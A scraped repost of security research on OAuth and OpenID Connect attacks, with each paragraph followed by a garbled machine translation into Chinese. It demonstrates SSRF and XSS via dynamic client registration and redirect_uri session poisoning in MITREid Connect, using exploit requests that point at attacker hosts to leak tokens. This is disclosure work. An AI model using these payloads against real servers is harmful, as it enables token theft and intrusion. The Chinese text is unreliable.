<!doctype html><html lang="zh-hans"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>OAuth攻击向量 OAuth Attack Vectors</title><link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous"><link rel="stylesheet" href="/img/css.css?random="><link data-rh="true" rel="icon" href="/img/favicon.ico"/><script data-ad-client="ca-pub-6067137220025946" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script type="text/javascript" src="https://platform-api.sharethis.com/js/sharethis.js#property=5effb96910009800120b8d4d&product=inline-share-buttons" async="async"></script>
<script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?03c1a0f31299b4a2fbb83c34d6beaac9";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script></head><body><div id="my_header"><div class="container"><nav class="navbar navbar-expand-lg"><a class="navbar-brand" href="/"><img alt="diglog" src="/img/logo.v1.gif" class="rounded-sm"></a><button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation"><span class="navbar-toggler-icon"></span></button><div class="collapse navbar-collapse" id="navbarNavAltMarkup"><div class="navbar-nav"></div></div></nav></div></div><div class="container"><div id="my_content"><h1 class="page_narrow">OAuth Attack Vectors<br/>OAuth攻击向量 </h1><div class="row"><div class="col-lg-12 col-12"><div class="my_story_list_item shadow p-3 mb-5 bg-white rounded"><div class="story_page_pub_time page_narrow">2021-03-26 19:49:03</div><div class="story_img_container"><a href="http://img2.diglog.com/img/2021/3/b5267d51716eb4f154037b591082e3e2.jpg"><img src="http://img2.diglog.com/img/2021/3/b5267d51716eb4f154037b591082e3e2.jpg" class="img-fluid my_story_img" onerror="this.style.display='none'"></a></div><div class="page_narrow text-break page_content"><p>The OAuth2 authorization protocol has been under fire for the past ten years. You&#39;ve probably already heard about plenty of &#34;return_uri&#34; tricks, token leakages, CSRF-style attacks on clients, and more. In this post, however, we&#39;re going to present three brand new OAuth2 and OpenID Connect vulnerabilities: &#34; Dynamic Client Registration: SSRF by design&#34;, &#34; redirect_uri Session Poisoning&#34;, and &#34; WebFinger User Enumeration&#34;. We&#39;ll go over the key concepts, demonstrate these attacks on two open-source  OAuth servers (ForgeRock OpenAM and MITREid Connect), and provide some tips on how you can detect these vulnerabilities yourself.</p><p>oauth2授权协议在过去的十年里被射了。你可能已经听过大量＆＃34; return_uri＆＃34;技巧，令牌泄漏，CSRF风格攻击客户，更多。然而，在这篇文章中，我们将参加三个全新的OAuth2和OpenID连接漏洞：＆＃34;动态客户端注册：SSRF由设计＆＃34;＆＃34; redirect_uri会话中毒＆＃34 ;,和＃34; Webfinger用户枚举＆＃34;我们＆＃39; LL浏览关键概念，演示了两个开源OAuth服务器（Forgerock Openam和Mitreid Connect）的这些攻​​击，并提供了一些关于如何自行检测这些漏洞的提示。</p><p> Don&#39;t fret if you&#39;re not familiar with some of the classic OAuth vulnerabilities. Although we won&#39;t discuss them here, we&#39;ve covered these extensively on our Web Security Academy:  https://portswigger.net/web-security/oauth.</p><p> 如果您＆＃39;重新熟悉一些经典的OAuth漏洞，请不要＆＃39; T FRET。虽然我们赢得了＆＃39;在这里讨论它们，我们＆＃39;在我们的Web安全学院界面覆盖了这些：https://portswigge.net/web-security/oauth。</p><p>  Before diving into the vulnerabilities, we should briefly talk about OpenID. OpenID Connect is a popular extension to the OAuth protocol that brings a number of new features, including id_tokens, automatic discovery, a configuration endpoint and a whole lot more. From a  pentesting point of view, whenever you test an OAuth application, there is a good chance that the target server also supports OpenID, which greatly extends the available attack surface. As a bug hunter, whenever you&#39;re testing an OAuth process, you should try to fetch the standard &#34;/.well-known/openid-configuration&#34; endpoint. This can give you a lot of information even in a black-box assessment.</p><p>  在潜入漏洞之前，我们应该简要谈谈OpenID。 OpenID Connect是对OAuth协议的流行扩展，它带来了许多新功能，包括ID_Tokens，自动发现，配置端点和更多更多。从Pentesting的角度来看，每当您测试OAuth应用程序时，目标服务器也有很大的机会支持OpenID，这大大扩展了可用攻击表面。作为一个错误的猎人，每当你＆＃39;重新测试OAuth过程，你应该尝试获取标准＆＃34; /。众所周知的/ openid-configuration＆＃34;端点。即使在黑匣子评估中，这也可以为您提供大量信息。</p><p>  Many OAuth attacks described in the past target the authorization endpoint, as you see it in the browser&#39;s traffic every time you log in. If you&#39;re testing a website and see a request like &#34;/authorize?client_id=aaa&amp;redirect_uri=bbb&#34;, you can be relatively sure it is an OAuth endpoint with plenty of parameters that you can already test. At the same time, since OAuth is a complex protocol, there are additional endpoints that may be supported by the server even though they are never referenced from client-side HTML pages.</p><p>  过去的许多OAuth攻击在浏览器中看到授权端点时，每次登录时都会在浏览器中看到授权端点。如果您＆＃39;重新测试网站并查看类似＆＃34的请求; /授权？client_id = aaa＆amp; redirect_uri = bbb＆＃34;，你可以相对肯定是一个OAuth终端，你可以已经测试了大量的参数。同时，由于OAuth是一个复杂的协议，因此即使从未从客户端 - 侧HTML页面中引用，服务器也可以支持其他端点。</p><p> One of the hidden URLs that you may miss is the  Dynamic Client Registration endpoint. In order to successfully authenticate users, OAuth servers need to know details about the client application, such as the &#34;client_name&#34;, &#34;client_secret&#34;, &#34;redirect_uris&#34;, and so on. These details can be provided via local configuration, but OAuth authorization servers may also have a special registration endpoint. This endpoint is normally mapped to &#34;/register&#34; and accepts POST requests with the following format:</p><p> 您可能错过的隐藏URL之一是动态客户端注册端点。为了成功认证用户，OAuth服务器需要了解有关客户端应用程序的详细信息，例如＆＃34; client_name＆＃34;＆＃34; client_secret＆＃34 ;,＆＃34; redirect_uris＆＃34 ;,等等在。这些细节可以通过本地配置提供，但OAuth授权服务器也可以具有特殊的注册端点。该端点通常映射到＆＃34; /寄存器＆＃34;并接受具有以下格式的POST请求：</p><p> POST /connect/register HTTP/1.1  Content-Type: application/json  Host: server.example.com  Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJ ...  {   &#34;application_type&#34;: &#34;web&#34;,   &#34;redirect_uris&#34;: [ &#34;https://client.example.org/callback&#34;],   &#34;client_name&#34;: &#34;My Example&#34;,   &#34;logo_uri&#34;:  &#34;https://client.example.org/logo.png&#34;,   &#34;subject_type&#34;: &#34;pairwise&#34;,   &#34;sector_identifier_uri&#34;:  &#34;https://example.org/rdrct_uris.json&#34;,   &#34;token_endpoint_auth_method&#34;: &#34;client_secret_basic&#34;,   &#34;jwks_uri&#34;:  &#34;https://client.example.org/public_keys.jwks&#34;,   &#34;contacts&#34;: [&#34;ve7jtb@example.org&#34;],   &#34;request_uris&#34;: [&#34;https://client.example.org/rf.txt&#34;] }  There are two specifications that define parameters in this request:  RFC7591 for OAuth and  Openid Connect Registration 1.0.</p><p> 发布/连接/注册HTTP / 1.1内容类型：应用程序/ JSON主机：server.example.com授权：持票人eyjhbgciojsuzi1nij9.eyj ... {＆＃34; application_type＆＃34 ;:＆＃34; web＆＃34;， ＆＃34; redirect_uris＆＃34 ;: [＆＃34; https：//client.example.org/callback&#34;]，＆＃34; client_name＆＃34 ;:＆＃34;我的例子＆＃34;，＆ ＃34; logo_uri＆＃34 ;:＆＃34; https：//client.example.org/logo.png& #34 ;,＆＃34; subject_type＆＃34 ;:＆＃34;成对＆＃34 ;,＆＃34 ; sector_identier_uri＆＃34 ;:＆＃34; https：//example.org/rdrct_uris.json&#34 ;,＆＃34; token_endpoint_auth_method＆＃34 ;:＆＃34; client_secret_basic＆＃34 ;,＆＃34; jwks_uri＆＃34 ;：＆＃34; https：//client.example.org/public_keys.jwks& #34 ;,＆＃34;联系人＆＃34 ;: [＆＃34; Ve7jtb@example.org&#34;]，＆＃34 ; Request_uris＆＃34 ;: [＆＃34; https：//client.example.org/rf.txt& n34;]}有两个规范在此请求中定义参数：RFC7591用于OAuth和OpenID连接注册1.0。</p><p> As you can see here, a number of these values are passed in via URL references and look like potential targets for  Server Side Request Forgery. At the same time, most servers we&#39;ve tested do not resolve these URLs immediately when they receive a registration request. Instead, they just save these parameters and use them later during the OAuth authorization flow. In other words, this is more like a second-order SSRF, which makes black-box detection harder.</p><p> 正如您可以在此处看到的，则通过URL引用传递许多这些值，并看起来像服务器端请求伪造的潜在目标。与此同时，大多数服务器WE＆＃39;在收到注册请求时，您无法立即解决这些URL。相反，它们只需保存这些参数并在OAuth授权流程期间稍后使用它们。换句话说，这更像是二阶SSRF，这使得黑盒检测更加困难。 </p><p>  logo_uri - URL that references a logo for the client application. After you register a client, you can try to call the OAuth authorization endpoint (&#34;/authorize&#34;) using your new &#34;client_id&#34;. After the login, the server will ask you to approve the request and may display the image from the &#34;logo_uri&#34;. If the server fetches the image by itself, the SSRF should be triggered by this step. Alternatively, the server may just include the logo via a client-side &#34;&lt;img&gt;&#34; tag. Although this doesn&#39;t lead to SSRF, it may lead to Cross Site Scripting if the URL is not escaped.</p><p>logo_uri  - 引用客户端应用程序的徽标的URL。注册客户端后，您可以尝试使用新的新＆＃34调用OAuth授权端点（＆＃34; /授权＆＃34; client_id＆＃34;登录后，服务器会要求您批准请求，并可以从＆＃34中显示图像; logo_uri＆＃34;如果服务器自行获取图像，则应通过此步骤触发SSRF。或者，服务器可以通过客户端＆＃34包括徽标;＆lt; img＆gt;＆＃34;标签。虽然这不导致SSRF，但如果URL未转义，它可能会导致跨站点脚本。</p><p>  jwks_uri - URL for the client&#39;s JSON Web Key Set [JWK] document. This key set is needed on the server for validating signed requests made to the token endpoint when using JWTs for client authentication [RFC7523]. In order to test for SSRF in this parameter, register a new client application with a malicious &#34;jwks_uri&#34;, perform the authorization process to obtain an authorization code for any user, and then fetch the &#34;/token&#34; endpoint with the following body:</p><p>  jwks_uri  - 客户端的URL＆＃39; s json web键集[JWK]文档。在使用JWTS for Client身份验证时，在服务器上需要此键集用于验证对令牌端点的签名请求[RFC7523]。要在此参数中测试SSRF，请使用恶意＆＃34注册新的客户端应用程序; jwks_uri＆＃34;，执行授权过程以获取任何用户的授权代码，然后获取＆＃34; /令牌＆ ＃34;带以下正文的端点：</p><p>   If vulnerable, the server should perform a server-to-server HTTP request to the supplied &#34;jwks_uri&#34; because it needs this key to check the validity of the &#34;client_assertion&#34; parameter in your request. This will probably only be a  blind SSRF vulnerability though, as the server expects a proper JSON response.</p><p>   如果易受攻击，则服务器应该对提供的和＃34执行服务器到服务器HTTP请求; jwks_uri＆＃34;因为它需要这个关键来检查＆＃34; client_assertion＆＃34的有效性;您的请求中的参数。尽管如此，这可能只是盲的SSRF漏洞，因为服务器期望适当的JSON响应。</p><p>  sector_identifier_uri - This URL references a file with a single JSON array of redirect_uri values. If supported, the server may fetch this value as soon as you submit the dynamic registration request. If this is not fetched immediately, try to perform authorization for this client on the server. As it needs to know the redirect_uris in order to complete the authorization flow, this will force the server to make a request to your malicious sector_identifier_uri.</p><p>  sector_identifier_uri  - 此URL引用一个文件的文件，单个json数组redirect_uri值。如果支持，则服务器可以在提交动态注册请求后立即获取此值。如果未立即获取此项，请尝试在服务器上执行此客户端的授权。由于它需要知道redirect_uris以完成授权流程，这将强制服务器向您的恶意扇区_iderifier_uri提出请求。</p><p>  request_uris - An array of the allowed request_uris for this client. The &#34;request_uri&#34; parameter may be supported on the authorization endpoint to provide a URL that contains a JWT with the request information (see  https://openid.net/specs/openid-connect-core-1_0.html#rfc.section.6.2).</p><p>  Request_URIS  - 此客户端的允许请求_URIS数组。 ＆＃34; Request_uri＆＃34;授权端点可以支持参数以提供包含具有请求信息的JWT的URL（请参阅https://openid.net/specs/openid-connect-core-1_0.html#rfc.section.6.2）。</p><p>  Even if dynamic client registration is not enabled, or it requires authentication, we can try to perform SSRF on the authorization endpoint simply by using &#34;request_uri&#34;:</p><p>  即使没有启用动态客户端注册，或者它需要身份验证，我们也可以尝试通过使用＆＃34执行授权端点上的SSRF; Request_Uri＆＃34 ;:</p><p>    Note: do not confuse this parameter with &#34;redirect_uri&#34;. The &#34;redirect_uri&#34; is used for redirection after authorization, whereas &#34;request_uri&#34; is fetched by the server at the start of the authorization process.</p><p>    注意：不要将此参数与＆＃34混淆; redirect_uri＆＃34; ＆＃34; redirect_uri＆＃34;用于授权后用于重定向，而＆＃34; Request_uri＆＃34;在授权过程的开始时由服务器获取。 </p><p>  At the same time, many servers we&#39;ve seen do not allow arbitrary &#34;request_uri&#34; values: they only allow whitelisted URLs that were pre-registered during the client registration process. That&#39;s why we need to supply &#34;request_uris&#34;: &#34;https://ybd1rc7ylpbqzygoahtjh6v0frlh96.burpcollaborator.net/request.jwt&#34; beforehand.</p><p>与此同时，许多服务器＆＃39; ve看到不允许任意＆＃34; Request_uri＆＃34;值：它们仅允许在客户注册过程中预先注册的白名单URL。那个＆＃39;为什么我们需要提供＆＃34; Request_uris＆＃34 ;:＆＃34; https：//ybd1rc7ylpbqzygoahtjh6v0frlh96.burpcollaborator.net/request.jwt&#34;预先。</p><p>  The following parameters also contain URLs, but  are not normally used for issuing server-to-server requests. They are instead used for client-side redirection/referencing:</p><p>  以下参数还包含URL，但通常不会用于发出服务器到服务器请求。而是用于客户端重定向/引用：</p><p> policy_uri - URL that the Relying Party client application provides so that the end user can read about how their profile data will be used.</p><p> Policy_Uri  - 依赖方客户端应用程序提供的URL，以便最终用户可以读取如何使用其配置文件数据。</p><p>  tos_uri - URL that the Relying Party client provides so that the end user can read about the Relying Party&#39;s terms of service.</p><p>  TOS_URI  - 依赖方客户提供的URL，以便最终用户可以阅读依赖派对＆＃39;服务条款。</p><p>  initiate_login_uri - URI using the https scheme that a third party can use to initiate a login by the RP. Also should be used for client-side redirection.</p><p>  Initiate_Login_Uri  -  URI使用第三方可以使用的HTTPS方案来启动RP登录。还应该用于客户端重定向。</p><p>  All these parameters are optional according to the OAuth and OpenID specifications and not always supported on a particular server, so it&#39;s always worth identifying which parameters are supported on your server.</p><p>  所有这些参数都是可选的，根据OAuth和OpenID规范，并不总是支持特定服务器，因此它始终值得识别服务器上支持哪些参数。</p><p> If you target an OpenID server, the discovery endpoint at &#34;.well-known/openid-configuration&#34; sometimes contains parameters such as &#34;registration_endpoint&#34;, &#34;request_uri_parameter_supported&#34;, and &#34;require_request_uri_registration&#34;. These can help you to find the registration endpoint and other server configuration values.</p><p> 如果您定位OpenID服务器，则在＆＃34处定位发现端点; .well  - 已知/ Openid-Configuration＆＃34;有时包含参数，如＆＃34; registration_endpoint＆＃34 ;,＆＃34; Request_Uri_Parameter_Supported＆＃34 ;,和＃34; Require_Request_Uri_Registration＆＃34;这些可以帮助您找到注册端点和其他服务器配置值。 </p><p>  MITREid Connect acts as a standalone OAuth authorization server. In the default configuration, most of its pages require proper authorization and you can&#39;t even create a new user - only administrators are allowed to create new accounts.</p><p>Mitreid Connect充当独立OAuth授权服务器。在默认配置中，其大部分页面都需要适当的授权，您甚至可以创建一个新的用户 - 仅允许管理员创建新帐户。</p><p> It also implements  OpenID Dynamic Client Registration protocol and supports registering client OAuth applications. Although this functionality is only referenced from the admin panel, the actual &#34;/register&#34; endpoint does not check the current session at all.</p><p> 它还实现OpenID动态客户端注册协议，并支持注册客户端OAuth应用程序。虽然此功能仅从管理面板，实际和＃34引用; /寄存器＆＃34;端点根本没有检查当前会话。</p><p> By looking at the source code, we discovered that MITREid Connect uses &#34;logo_uri&#34; in the following way:</p><p> 通过查看源代码，我们发现Mitreid Connect使用＆＃34; logo_uri＆＃34;通过以下方式：</p><p> During the registration process, the client application may specify its &#34;logo_uri&#34; parameter, which points to the image associated with the application. This &#34;logo_uri&#34; parameter could be an arbitrary URL.</p><p> 在注册过程中，客户端应用程序可以指定其＆＃34; logo_uri＆＃34;参数，指向与应用程序关联的图像。这个＆＃34; logo_uri＆＃34;参数可以是任意URL。</p><p>  On the authorization step, when a user is asked to approve the access requested by this new application, the authorization server makes a server-to-server HTTP request to download the image from &#34;logo_uri&#34; parameter, caches it, and displays to the user alongside other information.</p><p>  在授权步骤中，当要求用户批准此新应用程序请求的访问时，授权服务器使服务器到服务器HTTP请求从＆＃34下载图像; logo_uri＆＃34;参数，缓存它，并与其他信息一起显示给用户。</p><p>  This process happens when a user accesses the &#34;/openid-connect-server-webapp/api/clients/{id}/logo&#34; endpoint, which returns the content of the fetched &#34;logo_uri&#34;. Specifically, the vulnerable controller was located at  org.mitre.openid.connect.web.ClientAPI#getClientLogo</p><p>  当用户访问＆＃34; / OpenID-Connect-Server-WebApp / API /客户端/ {ID} /徽标＆＃34时发生此过程;终点，返回获取的＆＃34的内容; logo_uri＆＃34;具体来说，弱势控制器位于org.mitre.openid.connect.web.clientapi＃getClientLogo</p><p> Since the server does not check that the retrieved content is actually an image, it may be misused by an attacker to request any URL accessible from the authorization server and display its content, leading to a  Server Side Request Forgery attack.</p><p> 由于服务器未检查检索到的内容实际上是图像，因此攻击者可能被滥用，以请求从授权服务器访问的任何URL并显示其内容，从而导致服务器侧请求伪造攻击。 </p><p> This functionality may also be misused to perform a  Cross Site Scripting attack, as the &#34;getClientLogo&#34; controller does not enforce any image &#34;Content-Type&#34; header, allowing the attacker to display arbitrary HTML content from their own URL. If this HTML contains JavaScript code, it will be executed within the authorization server domain.</p><p>此功能也可能被滥用以执行跨站点脚本攻击，如＆＃34; getClientLogo＆＃34;控制器不强制执行任何图像和＃34;内容类型＆＃34;标题，允许攻击者从自己的URL显示任意HTML内容。如果此HTML包含JavaScript代码，则它将在授权服务器域中执行。</p><p>  We need to send a dynamic client registration request as described above. In this case, the bare minimum parameters we need to provide are &#34;redirect_uri&#34; and &#34;logo_uri&#34;:</p><p>  我们需要发送如上所述的动态客户端注册请求。在这种情况下，我们需要提供的裸露的最小参数是＆＃34; redirect_uri＆＃34;和＃34; logo_uri＆＃34 ;:</p><p> POST /openid-connect-server-webapp/register HTTP/1.1 Host: local:8080 Content-Length: 118 Content-Type: application/json  {   &#34;redirect_uris&#34;: [  &#34;http://artsploit.com/redirect&#34;  ],   &#34;logo_uri&#34;:  &#34;http://artsploit.com/xss.html&#34; } To initiate a server-to-server request to the specified &#34;logo_uri&#34;: &#34;http://artsploit.com/xss.html&#34;, a user should navigate the &#34;/api/clients/{client.id}/logo&#34; page:</p><p> Post / OpenID-Connect-Server-WebApp / Register HTTP / 1.1主机：本地：8080内容长度：118内容类型：应用程序/ JSON {＆＃34; Redirect_URIS＆＃34 ;: [＆＃34; http：// artsploit.com/redirect&#34; ]，＆＃34; logo_uri＆＃34 ;:＆＃34; http：//artsploit.com/xss.html&#34;向指定的＆＃34发起服务器到服务器请求; logo_uri＆＃34 ;:＆＃34; http：///artsploit.com/xss.html&#34;，用户应该导航＆＃34; /api/clients/ {client.id} /logo&#34;页：</p><p>  A low-privileged account is required to access the last page. If an attacker is able to obtain one via registration, they can use this endpoint to make an arbitrary HTTP request to a local server and display its result.</p><p>  访问最后一页需要低特权帐户。如果攻击者能够通过注册获取一个，则可以使用此端点将任意HTTP请求与本地服务器进行任意HTAT请求并显示其结果。</p><p> Alternatively, this attack can be used against already authenticated users to perform  XSS attacks, as it allows you to inject arbitrary JavaScript on the page. As shown on the example above, a malicious &#34;logo_uri&#34;: &#34;http://artsploit.com/xss.html&#34; can be used to execute an &#34;alert(document.domain)&#34; function.</p><p> 或者，该攻击可以针对已经经过身份验证的用户使用以执行XSS攻击，因为它允许您在页面上注入任意JavaScript。如上面的例子所示，恶意＆＃34; logo_uri＆＃34 ;:＆＃34; http：//artsploit.com/xss.html&#34;可以用来执行＆＃34;警报（document.domain）＆＃34;功能。</p><p> The {client.id} parameter is an incremental value associated with every new client that is registered with the OAuth server. It can be obtained after the client registration without any credentials. As one default client application already exists when the server is created, the first dynamically registered client will have the client_id &#34;2&#34;.</p><p> {client.id}参数是与在OAuth Server注册的每个新客户端关联的增量值。它可以在客户注册后没有任何凭据获得。由于创建服务器时已存在一个默认客户端应用程序，则第一个动态注册的客户端将具有Client_ID＆＃34; 2＆＃34;</p><p> As we can see from this exploit, OAuth servers may have second-order SSRF vulnerabilities in the registration endpoint as the spec explicitly states that a number of values may be provided by URL references. These vulnerabilities are subtle to find, but since the OAuth registration request format is standardized, it is still possible even in black-box scenarios.</p><p> 正如我们从该漏洞所看到的那样，OAuth服务器可以在注册端点中具有二阶SSRF漏洞，因为规范明确地指出，URL引用可以提供多个值。这些漏洞是微妙的，但由于OAuth注册请求格式标准化，即使在黑匣子方案中也可能仍然可以。 </p><p>   The next vulnerability we&#39;ll look at lies in the way the server carries over parameters during the authentication flow.</p><p>下一个漏洞我们＆＃39; ll在服务器在认证流程中进行参数的方式看。</p><p> According to the OAuth specification (section 4.1.1 in  RFC6749), whenever the OAuth server receives the authorization request, it should &#34;validate the request to ensure that all required parameters are present and valid. If the request is valid, the authorization server authenticates the resource owner and obtains an authorization decision (by asking the resource owner or by establishing approval via other means)&#34;</p><p> 根据OAuth规范（RFC6749中的第4.1.1节），每当OAuth服务器接收到授权请求时，它应该＆＃34;验证请求，以确保存在所有必需参数并有效。如果请求有效，授权服务器会验证资源所有者并获得授权决定（通过询问资源所有者或通过其他方式建立批准）和＃34;</p><p> Sounds simple, right? On almost all OAuth diagrams, this process is displayed as a single step, but it actually involves three separate actions that need to be implemented by the OAuth server:</p><p> 听起来很简单，对吗？在几乎所有OAuth图中，此过程显示为单一步骤，但它实际上涉及oauth服务器需要实现的三个单独操作：</p><p>  In many OAuth server implementations we&#39;ve seen, these steps are separated by using three different controllers, something like &#34;/authorize&#34;, &#34;/login&#34;, and &#34;/confirm_access&#34;.</p><p>  在许多OAuth服务器实现中我们看到了，这些步骤通过使用三个不同的控制器来分开，类似于＆＃34; /授权＆＃34; / login＆＃34;和＃34; / Confirms_access＆＃34;</p><p> On the first step (&#34;/authorize&#34;) the server checks &#34;redirect_uri&#34; and &#34;client_id&#34; parameters. Later, at the &#34;/confirm_access&#34; stage, the server needs to use these parameters to issue the code. So how does the server remember them? The most obvious ways would be:</p><p> 在第一步（＆＃34; /授权＆＃34;）服务器检查＆＃34; redirect_uri＆＃34;和＃34; client_id＆＃34;参数。后来，在＆＃34; / confirm_access＆＃34;阶段，服务器需要使用这些参数来发出代码。那么服务器如何记住它们？最明显的方式是：</p><p> To carry them over in HTTP query parameters for every step. This could require validity checks on each step and the validation procedures may be different.</p><p> 将它们携带在每一步的HTTP查询参数中。这可能需要对每个步骤进行有效性检查，并且验证程序可能不同。</p><p>  Create a new &#34;interaction_id&#34; parameter, which uniquely identifies each OAuth authorization flow that is initiated with the server.</p><p>  创建一个新的＆＃34; Interaction_id＆＃34;参数，唯一标识与服务器启动的每个OAuth授权流程。 </p><p> As we can see here, this is something that the strict OAuth specification does not really give any advice about. As a result, there is a diverse range of approaches to implementing this behavior.</p><p>正如我们可以在这里看到的，这是严格的OAuth规范并没有真正提供任何建议。因此，实现这种行为存在各种方法。</p><p> The first approach (store in session) is quite intuitive and looks elegant in the code, but it can cause race condition problems when multiple authorization requests are sent simultaneously for the same user.</p><p> 第一种方法（会话中的商店）非常直观，在代码中看起来优雅，但在同一用户同时发送多个授权请求时，它可能会导致竞争条件问题。</p><p>  /authorize? client_id=client&amp; response_type=code&amp; redirect_uri=http://artsploit.com/ The server checks the parameters, stores them in the session, and displays a consent page:</p><p>  /授权？ client_id =客户端＆amp; response_type =代码＆amp; redirect_uri = http：//artsploit.com/服务器检查参数，将它们存储在会话中，并显示同意书：</p><p>    As you can see, the request body  does not contain any parameters about the client being authorized, which means that the server takes them from the user&#39;s session. We can even spot this behavior during black-box testing.</p><p>    如您所见，请求正文不包含有关所授权客户端的任何参数，这意味着服务器将它们从用户＆＃39; s会话中。我们甚至可以在黑盒测试期间发现这种行为。</p><p>  (in the background) The page sends a hidden cross-domain request to the OAuth authorization page with an &#34;untrustworthy&#34; &#34;client_id&#34;, which poisons the session.</p><p>  （在后台）页面向OAuth授权页面发送隐藏的跨域请求，其中包含＆＃34;不值得信任和＃34; ＆＃34; client_id＆＃34;，哪个毒物会议。</p><p>  The user approves the first page and, since the session contains the updated value, the user will be redirected to the &#34;redirect_uri&#34; of the untrusted client.</p><p>  用户批准第一页，因为会话包含更新值，用户将被重定向到＆＃34; redirect_uri＆＃34;不受信任的客户。</p><p> In many real systems, third-party users can register their own clients, so this vulnerability may allow them to register an arbitrary &#34;redirect_uri&#34; and leak a token to it.</p><p> 在许多真实系统中，第三方用户可以注册自己的客户，因此这种漏洞可能允许他们注册任意＆＃34; redirect_uri＆＃34;并泄露给它。 </p><p> There are some caveats, however: the user has to approve any &#34;trusted&#34; client. If they have already approved the same client earlier, the server might just redirect us without asking for confirmation. Conveniently, the OpenID specification provides us with a &#34;prompt=consent&#34; parameter, which we can append to the URL of the authorization request to potentially get around this problem. If the server follows OpenID spec, it should ask the user for confirmation of their consent even if they have previously granted it. Without confirmation, the exploitation is harder but still feasible, depending on the particular OAuth server implementation.</p><p>然而，有一些警告：用户必须批准任何＆＃34;值得信赖的＆＃34;客户。如果他们已经批准了同一客户端，则服务器可能只是重新rirect我们而不要求确认。方便地，OpenID规范为我们提供了A＆＃34;提示=同意＆＃34;参数，我们可以追加授权请求的URL，以妨碍此问题。如果服务器遵循OpenID规范，则应要求用户确认其同意，即使他们先前授予它。如果没有确认，则剥削更难但仍然可行，具体取决于特定的OAuth服务器实现。</p><p>  The MITREid Connect server was vulnerable to the session poisoning issue described above. In this case, exploitation didn&#39;t even require registering an additional client because the application has a mass assignment vulnerability on the confirmation page, which also leads to the session poisoning.</p><p>  Mitreid Connect Server容易受上述会话中毒问题的影响。在这种情况下，甚至需要注册额外客户端的开发，因为应用程序在确认页面上具有大规模分配漏洞，这也导致会话中毒。</p><p> During the OAuth2 flow, when a user navigates to the authorization page (&#34;/authorize&#34;), the AuthorizationEndpoint class correctly checks all provided parameters (client_id, redirect_uri, scope, etc…). After that, when the user is authenticated, the server displays a confirmation page, asking the user to approve the access. The user&#39;s browser only sees the &#34;/authorize&#34; page but, internally, the server performs an internal request forwarding from &#34;/authorize&#34; to &#34;/oauth/confirm_access&#34;. In order to pass parameters from one page to another, the server uses an &#34;@ModelAttribute(&#34;authorizationRequest&#34;)&#34; annotation on the  &#34;/oauth/confirm_access&#34; controller:</p><p> 在OAuth2流程期间，当用户导航到授权页面（＆＃34; /授权＆＃34;）时，authorizationendpoint类正确检查所有提供的参数（client_id，redirect_uri，scope等）。之后，当用户经过身份验证时，服务器显示确认页面，要求用户批准访问权限。用户＆＃39; s浏览器只会看到＆＃34; /授权＆＃34;页面，但在内部，服务器执行从＆＃34的内部请求转发; /授权＆＃34; ＆＃34; / oauth / bearm_access＆＃34;为了将参数从一个页面传递给另一个页面，服务器使用一个＆＃34; @modelattribute（＆＃34; authorizationRequest＆＃34;）＆＃34; ＆＃34; / oauth / confirm_access＆＃34;控制器：</p><p> @PreAuthorize( &#34;hasRole(&#39;ROLE_USER&#39;)&#34;) @RequestMapping( &#34;/oauth/confirm_acces&#34;) public String  confimAccess(Map&lt;String, Object&gt; model,  @ModelAttribute(&#34;authorizationRequest&#34;) AuthorizationRequest authRequest, Principal p) {  This annotation is a bit tricky; it not only takes parameters from the Model of the previous controller, but also takes their values  from the current HTTP request query. So, if the user navigates directly to the &#34;/oauth/confirm_access&#34; endpoint in the browser, it is able to provide all AuthorizationRequest parameters from the URL and bypass the check on the &#34;/authorize&#34; page.</p><p> @preacuthorize（＆＃34; hasrole（＆＃39;＆＃39;）＆＃34;）@requestmapping（＆＃34; / oauth / bearm_acces＆＃34;）public string confimaccess（map＆lt; string，对象＆gt;型号， @modelattribute（＆＃34; authorizationRequest＆＃34;）authorizationRequest authrequest，主体p）{这个注释有点棘手;它不仅从上一个控制器的模型中取参数，而且还从当前的HTTP请求查询中获取它们的值。所以，如果用户直接导航到＆＃34; / oauth / confirm_access＆＃34;浏览器中的端点，它能够从URL提供所有授权重新查询参数，并绕过＆＃34的检查; /授权＆＃34;页。</p><p> The only caveat here is that the &#34;/oauth/confirm_access&#34; controller requires @SessionAttributes(&#34;authorizationRequest&#34;) to be present in the user&#39;s session. However, this can easily be achieved simply by visiting the &#34;/authorize&#34; page without performing any actions on it. The impact of this vulnerability is similar to the classic scenario in which the &#34;redirect_uri&#34; is never checked.</p><p> 这里唯一的警告是＆＃34; / oauth / confirm_access＆＃34;控制器需要@SessionAttributes（＆＃34; authorizationRequest＆＃34;）出席在用户＆＃39; s会话中。但是，这很容易通过访问和＃34来实现; /授权＆＃34;页面而不对其执行任何操作。这种漏洞的影响类似于＆＃34; redirect_uri＆＃34的经典场景类似于经典场景;从未检查过。</p><p>  A malicious actor could craft two special links to the authorization and confirmation endpoints, each with its own &#34;redirect_uri&#34; parameter, and supply them to the user.</p><p>  恶意演员可以制作两个特殊的链接到授权和确认终点，每个都有自己的＆＃34; redirect_uri＆＃34;参数，并将它们提供给用户。</p><p> /authorize? client_id=c931f431-4e3a-4e63-84f7-948898b3cff9&amp; response_type=code&amp; scope=openid&amp; prompt=consent&amp; redirect_uri=http://trusted.example.com/redirect /oauth/confirm_access? client_id=c931f431-4e3a-4e63-84f7-948898b3cff9&amp; response_type=code&amp; prompt=consent&amp; scope=openid&amp; redirectUri= http://malicious.example.com/steal_token The &#34;client_id&#34; parameter can be from any client application the user already trusts. When &#34;/confirm_access&#34; is accessed, it takes all the parameters from the URL and poisons the model/session. Now, when a user approves the first request (since the &#34;client_id&#34; it&#39;s trusted), the authorization token is leaked to the malicious website.</p><p> /授权？ client_id = c931f431-4e3a-4e63-84f7-948898b3cff9＆amp; response_type =代码＆amp;范围= OpenID＆amp;提示=同意＆amp; redirect_uri = 